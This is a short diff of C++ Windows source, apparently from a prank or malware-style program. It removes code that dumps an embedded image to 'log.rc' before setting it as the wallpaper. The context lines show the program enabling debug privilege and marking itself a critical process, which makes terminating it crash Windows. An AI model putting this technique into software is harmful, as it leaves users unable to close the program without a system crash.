@@ -121,13 +121,7 @@ int APIENTRY WinMain(
 	if (EnableSeDebugPrivilege()) {
 		SetProcessAsCritical();
 	}
-	// Make new file with jpg char array
 	// TODO: change picture load
-	ofstream savefile("log.rc"); 
-	for (int x = 0; x < 13609; x++) {
-		savefile << *(jpg + x);
-	}
-	savefile.close();
 	// Set the wallpaper
 	const wchar_t* path = L"log.rc";
 	int result;
